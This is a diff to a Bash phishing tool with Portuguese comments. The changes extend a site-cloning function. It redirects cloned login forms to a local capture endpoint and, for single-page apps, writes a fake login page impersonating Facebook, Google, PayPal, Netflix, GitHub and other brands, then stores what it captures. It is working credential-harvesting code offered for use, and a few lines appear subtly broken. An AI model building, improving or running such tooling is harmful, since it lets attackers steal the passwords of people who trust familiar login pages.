@@ -100,13 +100,200 @@ clone_site() {
     fi
     local html_size=$(wc -c < "$SITE_DIR/index.html")
     echo -e "${GREEN}  → ${html_size} bytes${NC}"
-    if [ "$html_size" -lt 5000 ]; then
-        echo -e "${YELLOW}  ⚠ HTML muito pequeno — site pode ser 100% JS (React/Vue).${NC}"
-        echo -e "${YELLOW}    Resultado pode ficar sem estilo ou branco.${NC}"
+
+    # Detectar SPA (Angular/React/Vue) — impossível clonar funcional
+    local base_domain=$(echo "$target_url" | sed -E 's|(https?://[^/]+).*|\\1|')
+    local is_spa=0
+    local spa_type=""
+    grep -qi 'app-root\|_nghost\|__NEXT_DATA__\|data-reactroot\|ng-version\|vue-router' "$SITE_DIR/index.html" 2>/dev/null && is_spa=1
+    grep -qi 'app-root\|_nghost\|ng-version' "$SITE_DIR/index.html" 2>/dev/null && spa_type="Angular"
+    grep -qi '__NEXT_DATA__\|__next' "$SITE_DIR/index.html" 2>/dev/null && spa_type="Next.js"
+    grep -qi 'data-reactroot\|react' "$SITE_DIR/index.html" 2>/dev/null && spa_type="React"
+    grep -qi 'vue-router\|vue.js' "$SITE_DIR/index.html" 2>/dev/null && spa_type="Vue.js"
+
+    if [ "$is_spa" = "1" ]; then
+        echo -e "  ${RED}⚠ SPA detectado: ${spa_type}${NC}"
+        echo -e "  ${YELLOW}→ Gerando página fake funcional${NC}"
+        # Baixar favicon/logo
+        local favicon="$($curl_cmd $curl_opts -sI -L "${base_domain}/favicon.ico" 2>/dev/null | grep -i 'content-type.*image' || echo '')"
+        $curl_cmd $curl_opts -s -o "$SITE_DIR/favicon.png" "${base_domain}/favicon.ico" 2>/dev/null
+        $curl_cmd $curl_opts -s -o "$favicon" "${base_domain}/favicon.ico" 2>/dev/null
+
+        # Buscar logo no header
+        local logo_url=$(grep -oE 'src="[^"]*logo[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | head -1 | sed 's/src="//;s/"//')
+        [ -z "$logo_url" ] && logo_url=$(grep -oE 'href="[^"]*logo[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | head -1 | sed 's/href="//;s/"//')
+        if [ -n "$logo_url" ]; then
+            local logo_abs=""
+            echo "$logo_url" | grep -q "^http" && logo_abs="$logo_url"
+            echo "$logo_url" | grep -q "^//" && logo_abs="https:$logo_url"
+            [ -z "$logo_abs" ] && logo_abs="${base_domain}${logo_url}"
+            $curl_cmd $curl_opts -s -o "$SITE_DIR/logo.png" "$logo_abs" 2>/dev/null
+        fi
+
+        # Extrair nome do domínio pra label
+        local site_name=$(echo "$target_url" | sed -E 's|https?://||;s|[^a-zA-Z0-9].||g; s|www\.||' | cut -c1-20)
+        local main_color="#3897f0"
+        if grep -qiE 'facebook\.com|fb\.com' "$SITE_DIR/index.html"; then
+            main_color="#1877f2"
+            site_name="Facebook"
+        elif grep -qiE 'google\.com' "$SITE_DIR/index.html"; then
+            main_color="#4285f4"
+            site_name="Google"
+        elif grep -qiE 'twitter\.com|x\.com' "$SITE_DIR/index.html"; then
+            main_color="#1da1f2"
+            site_name="Twitter"
+        elif grep -qiE 'netflix\.com' "$SITE_DIR/index.html"; then
+            main_color="#e50914"
+            site_name="Netflix"
+        elif grep -qiE 'amazon\.com' "$SITE_DIR/index.html"; then
+            main_color="#ff9900"
+            site_name="Amazon"
+        elif grep -qiE 'linkedin\.com' "$SITE_DIR/index.html"; then
+            main_color="#0077b5"
+            site_name="LinkedIn"
+        elif grep -qiE 'discord\.com' "$SITE_DIR/index.html"; then
+            main_color="#5865f2"
+            site_name="Discord"
+        elif grep -qiE 'github\.com' "$SITE_DIR/index.html"; then
+            main_color="#333333"
+            site_name="GitHub"
+        elif grep -qiE 'paypal\.com' "$SITE_DIR/index.html"; then
+            main_color="#003087"
+            site_name="PayPal"
+        elif grep -qiE 'spotify\.com' "$SITE_DIR/index.html"; then
+            main_color="#1db954"
+            site_name="Spotify"
+        elif grep -qiE 'telegram\.org|t\.me' "$SITE_DIR/index.html"; then
+            main_color="#0088cc"
+            site_name="Telegram"
+        fi
+
+        # Criar página fake
+        cat > "$SITE_DIR/index.html" << ENDHTML
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Entrar - ${site_name}</title>
+    <link rel="icon" href="favicon.png">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #fafafa;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            direction: ltr;
+        }
+        .container {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            padding: 40px;
+            width: 350px;
+            max-width: 90vw;
+            text-align: center;
+            margin: 10px;
+        }
+        .logo { margin-bottom: 20px; }
+        .logo img { max-width: 170px; max-height: 80px; }
+        .site-title {
+            font-size: 28px;
+            font-weight: 300;
+            color: #262626;
+            margin: 10px 0 5px;
+        }
+        .subtitle {
+            font-size: 14px;
+            color: #8e8e8e;
+            margin-bottom: 24px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 4px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            font-size: 14px;
+            background: #fafafa;
+        }
+        input:focus { outline: none; border-color: ${main_color}; }
+        button {
+            width: 100%;
+            padding: 10px;
+            margin: 12px 0;
+            background: ${main_color};
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            opacity: 0.9;
+        }
+        button:hover { opacity: 1; }
+        .divider {
+            margin: 18px 0;
+            font-size: 13px;
+            color: #8e8e8e;
+            text-transform: uppercase;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="logo.png" alt="${site_name}" onerror="this.style.display='none'">
+            <div class="site-title">${site_name}</div>
+            <div class="subtitle">Entrar na sua conta</div>
+        </div>
+        <form method="POST" action="/login">
+            <input type="text" name="username" placeholder="Usuário, email ou telefone" required>
+            <input type="password" name="password" placeholder="Senha" required>
+            <button type="submit">Entrar</button>
+        </form>
+        <div class="divider">ou</div>
+        <div class="footer">
+            <a href="#" onclick="return false;" style="color:#3897f0;text-decoration:none;">Esqueceu a senha?</a>
+        </div>
+    </div>
+</body>
+</html>
+ENDHTML
+
+        # Limpar recursos não usados no modo FAKE
+        rm -f "$SITE_DIR"/css_*.css "$SITE_DIR"/js_*.js "$SITE_DIR"/asset_* 2>/dev/null
+        echo -e "  ${GREEN}✓ Página fake gerada (${site_name})${NC}"
+
+        # Pular resto do processo de clone tradicional
+        local skip_traditional=1
+    else
+        local skip_traditional=0
     fi
 
-    # Extrair domínio base
-    local base_domain=$(echo "$target_url" | sed -E 's|(https?://[^/]+).*|\1|')
+    if [ "$skip_traditional" = "1" ]; then
+        # Pular direto pro server startup
+        local final_url="$local_url"
+    fi
+
+    if [ "$html_size" -lt 5000 ] && [ "$is_spa" != "1" ]; then
+        echo -e "${YELLOW}  ⚠ HTML muito pequeno (site pode ter bloqueio)${NC}"
+    fi
+
+    if [ "$is_spa" != "1" ]; then
+    # Extrair domínio base (só faz sentido se não for SPA)
+    local base_domain=$(echo "$target_url" | sed -E 's|(https?://[^/]+).*|\\1|')
+
+    local my_ip=$(get_my_ip)
+    local local_url="http://${my_ip}:${port}"
 
     # 2. Baixar CSS — pega todos <link rel="stylesheet"> e também href com .css
     echo -e "${YELLOW}[2/4] Baixando CSS...${NC}"
@@ -135,7 +322,7 @@ clone_site() {
         # Trocar no HTML usando perl (literal, sem regex issues)
         perl -i -pe "s|\Q${css_url}\E|${css_file}|g" "$SITE_DIR/index.html"
         # Também substituir versão absoluta
-        local abs1="${base_domain}${css_url}";
+        local abs1="${base_domain}${css_url}"
         [ "$abs1" != "$css_url" ] && perl -i -pe "s|\Q${abs1}\E|${css_file}|g" "$SITE_DIR/index.html"
         css_count=$((css_count + 1))
     done < "$css_list_file"
@@ -173,8 +360,6 @@ clone_site() {
 
     # 4. Modificar formulários pra captura
     echo -e "${YELLOW}[4/4] Configurando captura...${NC}"
-    local my_ip=$(get_my_ip)
-    local local_url="http://${my_ip}:${port}"
 
     # Capturar action original e redirecionar pra /login
     sed -i 's/action="[^"]*"/action="\/login"/gI' "$SITE_DIR/index.html"
@@ -243,8 +428,10 @@ clone_site() {
     sed -i "s|http://${my_ip}|${local_url}|gI" "$SITE_DIR/index.html"
 
     echo -e "${GREEN}  → Formulários hackeados, URLs trocadas${NC}"
+    fi  # fim do if is_spa != 1
 
-    # Salvar no histórico
+    # Salvar no histórico (independente de SPA ou não)
+    # Extrair nome do domínio pra label (se ainda não foi)
     local site_name=$(echo "$target_url" | sed -E 's|https?://||;s|[^a-zA-Z0-9.]|_|g')
     local ts=$(date +%Y%m%d_%H%M)
     local hist_dir="$CAPTURED_DIR/${site_name}_${ts}"
